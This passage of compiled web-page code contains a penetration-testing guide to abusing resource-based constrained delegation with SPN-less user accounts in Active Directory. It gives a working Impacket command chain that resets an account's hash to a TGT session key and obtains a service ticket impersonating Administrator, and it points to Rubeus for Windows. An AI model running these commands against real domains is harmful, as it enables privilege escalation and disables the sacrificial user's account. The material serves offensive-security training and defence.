Rubeus.")])],-1),e("hr",null,null,-1),e("p",null,[e("strong",null,"Step 3"),t(": Pass-the-ticket 🛂")],-1),e("p",null,[t("Once the ticket is injected, it can natively be used when accessing the service (see "),e("a",{href:"./../ptt"},"pass-the-ticket"),t(").")],-1)])),_:1})]),_:1}),i[5]||(i[5]=r('<h3 id="rbcd-on-spn-less-users" tabindex="-1">RBCD on SPN-less users <a class="header-anchor" href="#rbcd-on-spn-less-users" aria-label="Permalink to &quot;RBCD on SPN-less users&quot;">​</a></h3><p>In 2022, <a href="https://twitter.com/tiraniddo" target="_blank" rel="noreferrer">Jame Forshaw</a> demonstrated that the SPN requirement wasn&#39;t completely mandatory and RBCD could be operated without: <a href="https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html" target="_blank" rel="noreferrer">Exploiting RBCD using a normal user</a>. While this technique is a bit trickier and should absolutely be avoided on regular user accounts (the technique renders them unusable for normal people), it allows to abuse RBCD even if the <a href="./../../builtins/machineaccountquota"><code>MachineAccountQuota</code></a> is set to 0. In this case, the first (edit the &quot;rbcd&quot; attribute) and last (&quot;Pass-the-ticket&quot;) steps are the same. Only the &quot;Obtain a ticket&quot; step changes.</p><p>The technique is as follows:</p><ol><li>Obtain a TGT for the SPN-less user allowed to delegate to a target and retrieve the TGT session key.</li><li>Change the user&#39;s password hash and set it to the TGT session key.</li><li><a href="./../#s4u2self-+-u2u">Combine S4U2self and U2U</a> so that the SPN-less user can obtain a service ticket to itself, on behalf of another (powerful) user, and then proceed to S4U2proxy to obtain a service ticket to the target the user can delegate to, on behalf of the other, more powerful, user.</li><li><a href="./../ptt">Pass the ticket</a> and access the target, as the delegated other</li></ol><div class="note custom-block"><p>While this technique allows for an abuse of the RBCD primitive, even when the <a href="./../../builtins/machineaccountquota"><code>MachineAccountQuota</code></a> is set to 0, or when the absence of LDAPS limits the creation of computer accounts, it requires a sacrificial user account. In the abuse process, the user account&#39;s password hash will be reset with another hash that has no known plaintext, effectively preventing regular users from using this account.</p></div>',5)),s(l,null,{default:a(()=>[s(n,{label:"UNIX-like"},{default:a(()=>i[2]||(i[2]=[e("p",null,[t("From UNIX-like systems, "),e("a",{href:"https://github.com/SecureAuthCorp/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),t(" (Python) scripts can be used to operate that technique. At the time of writing, September 7th 2022, some of the tools used below are in Pull Requests still being reviewed before merge ("),e("a",{href:"https://github.com/SecureAuthCorp/impacket/pull/1201",target:"_blank",rel:"noreferrer"},"#1201"),t(" and "),e("a",{href:"https://github.com/SecureAuthCorp/impacket/pull/1202",target:"_blank",rel:"noreferrer"},"#1202"),t(").")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Obtain a TGT through overpass-the-hash to use RC4")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"getTGT.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -hashes"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," :"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$("),e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"pypykatz"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," crypto"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," nt"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'SomePassword'"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},") "),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'domain'/'controlledaccountwithoutSPN'")]),t(`
`),e("span",{class:"line"}),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Obtain the TGT session key")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"describeTicket.py"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'TGT.ccache'"),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," |"),e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}}," grep"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'Ticket Session Key'")]),t(`
`),e("span",{class:"line"}),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Change the controlledaccountwithoutSPN's NT hash with the TGT session key")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"smbpasswd.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -newhashes"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," :TGTSessionKey"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'domain'/'controlledaccountwithoutSPN':'SomePassword'@'DomainController'")]),t(`
`),e("span",{class:"line"}),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Obtain the delegated service ticket through S4U2self+U2U, followed by S4U2proxy (the steps could be conducted individually with the -self and -additional-ticket flags)")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"KRB5CCNAME"),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'TGT.ccache'"),e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}}," getST.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u2u"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -impersonate"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "Administrator"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -spn"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "host/target.domain.com"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -k"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -no-pass"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'domain'/'controlledaccountwithoutSPN'")]),t(`
`),e("span",{class:"line"}),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# The password can then be reset to its old value (or another one if the domain policy forbids it, which is usually the case)")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"smbpasswd.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -hashes"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," :TGTSessionKey"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -newhashes"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," :OldNTHash"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'domain'/'controlledaccountwithoutSPN'@'DomainController'")])])])],-1),e("p",null,[t("After these steps, the final service ticket can be used with "),e("a",{href:"./../ptt"},"Pass-the-ticket"),t(".")],-1)])),_:1}),s(n,{label:"Windows"},{default:a(()=>i[3]||(i[3]=[e("p",null,[t("From Windows systems, "),e("a",{href:"https://github.com/GhostPack/Rubeus",target:"_blank",rel:"noreferrer"},"Rubeus"),t(" (C#) can be used to operate the technique.")],-1),e("p",null,[t("The steps detailed in "),e("a",{href:"https://github.com/GhostPack/Rubeus/pull/137",target:"_blank",rel:"noreferrer"},"PR #137"),t(" can be followed.")],-1),e("p",null,[t("After these steps, the final service ticket can be used with "),e("a",{href:"./../ptt"},"Pass-the-ticket"),t(".")],-1)])),_:1})]),_:1}),i[6]||(i[6]=r('<h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/" target="_blank" rel="noreferrer">https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/</a></p><p><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html" target="_blank" rel="noreferrer">https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html</a></p><p><a href="https://www.netspi.com/blog/technical/network-penetration-testing/cve-2020-17049-kerberos-bronze-bit-theory/" target="_blank" rel="noreferrer">https://www.netspi.com/blog/technical/network-penetration-testing/cve-2020-17049-kerberos-bronze-bit-theory/</a></p><p><a href="https://dirkjanm.io/abusing-forgotten-permissions-on-precreated-computer-objects-in-active-directory/" target="_blank" rel="noreferrer">https://dirkjanm.io/abusing-forgotten-permissions-on-precreated-computer-objects-in-active-directory/</a></p><p><a href="https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html" target="_blank" rel="noreferrer">https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html</a></p><p><a href="https://tttang.com/archive/1617/" target="_blank" rel="noreferrer">https://tttang.com/archive/1617/</a></p>',7))])}const w=c(p,[["render",u]]);export{C as __pageData,w as default};
